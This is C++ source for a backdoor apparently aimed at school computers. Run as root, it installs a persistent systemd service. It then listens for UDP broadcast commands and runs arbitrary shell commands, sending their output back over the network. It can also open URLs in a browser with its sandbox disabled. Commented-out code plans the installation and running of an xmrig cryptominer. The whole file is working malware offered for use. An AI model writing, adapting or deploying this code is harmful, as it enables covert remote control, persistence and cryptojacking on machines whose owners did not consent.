#include <cstdlib>
#include <fstream>
#include <cstring>
#include <ios>
#include <netinet/in.h>
#include <string>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <vector>
#include <array>
#include <memory>

#define REC_PORT 6969
#define SENDING_PORT 6868
#define BUFFER_SIZE 256

std::vector<std::string> split(std::string str){
	std::string word = "";
	std::vector<std::string> res;
	for(char c : str){
		if(c == ';'){
			res.push_back(word);
			word = "";
		}
		else{
			word += c;
		}
	}
	res.push_back(word);
	return res;
}

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, int(*)(FILE*)> pipe(popen(cmd, "r"), pclose);
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }

    if (!result.empty() && result.back() == '\n') {
        result.pop_back();
    }

    return result;
}

int main() {
    std::string service = "/etc/systemd/system/eb.service";
    //it is run from root
    if(!std::ifstream(service)){
        std::ofstream sfile(service, std::ios::out);
        sfile << "[Unit]\n";
        sfile << "Description=echobreak\n";
        sfile << "After=multi-user.target";
        sfile << "\n";
        sfile << "[Service]\n";
        sfile << "Type=simple\n";
        sfile << "ExecStart=/bin/eb.net\n";
        sfile << "Restart=always\n";
        sfile << "User=root\n";
        sfile << "Group=nogroup\n";
        sfile << "\n";
        sfile << "[Install]\n";
        sfile << "WantedBy=multi-user.target";
        sfile.close();

        system("systemctl enable eb");
    }

    int send_sock;
    int opt = 1;
    struct sockaddr_in send_broadcastAddr;

    // sending
    if ((send_sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        std::ofstream log("log", std::ios::out);
        log << "Sending socket creation error";
        log.close();
        close(send_sock);
        return -1;
    }
    //enable broadcast
    if (setsockopt(send_sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt)) < 0) {
        std::ofstream log("log", std::ios::out);
        log << "Sending error setting socket options";
        log.close();
        close(send_sock);
        return -1;
    }

    memset(&send_broadcastAddr, 0, sizeof(send_broadcastAddr));
    send_broadcastAddr.sin_family = AF_INET;
    send_broadcastAddr.sin_port = htons(SENDING_PORT);
    send_broadcastAddr.sin_addr.s_addr = inet_addr("172.17.213.255"); 

    //receiving

    int sock;
    struct sockaddr_in broadcastAddr;
    char buffer[BUFFER_SIZE];
    memset(buffer, 0, sizeof(buffer));
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        std::ofstream log("log", std::ios::out);
        log << "socket err";
	    log.close();
        close(sock);
        return -1;
    }

    memset(&broadcastAddr, 0, sizeof(broadcastAddr));
    broadcastAddr.sin_family = AF_INET;
    broadcastAddr.sin_addr.s_addr = INADDR_ANY;
    broadcastAddr.sin_port = htons(REC_PORT);

    if (bind(sock, (struct sockaddr*)&broadcastAddr, sizeof(broadcastAddr)) < 0) {
        std::ofstream log("log", std::ios::out);
        log << "binding err";
	    log.close();
        close(sock);
        return -1;
    }

    std::vector<std::string> msg;

    while (true) {
        socklen_t addrLen = sizeof(broadcastAddr);
        socklen_t sendLen = sizeof(send_broadcastAddr);
        ssize_t bytesReceived = recvfrom(sock, buffer, BUFFER_SIZE, 0, (struct sockaddr*)&broadcastAddr, &addrLen);
        msg = split((std::string)buffer);

        if (bytesReceived > 0) {
            if(msg[0] == exec("hostname") || msg[0] == "all"){
                if(msg[1] == "cmd"){
                    std::string answ = exec(msg[2].c_str());
                    sendto(send_sock, answ.c_str(), answ.size(), 0, (struct sockaddr*)&send_broadcastAddr, addrLen);
                }
                else if(msg[1] == "open url"){
                        //ours school pc using yandex
                        system((std::string("yandex-browser-stable --no-sandbox ") + msg[2]).c_str());
                }
                //==========================================================================
                //coming soon
                /*
                else if(msg[1] == "inst_xmrig") {
                    // git clone https://github.com/Andrew-24coop/EchoBreak-xmrig.git
                    // cd EchoBreak-xmrig/xmrig-6.22.2
                    // change config.json file (rename "name_of_the_worker" to exec(hostname))
                    xmrig_flag = true;
                }
                else if(msg[1] == "run_xmrig") {
                    if (xmrig_flag) {
                        // run ./xmrig
                    }
                    else {
                        // send back error
                    }
                }*/
		               //==========================================================================
            }
            memset(buffer, 0, sizeof(buffer));
        }
    }

    close(sock);
    return 0;
}

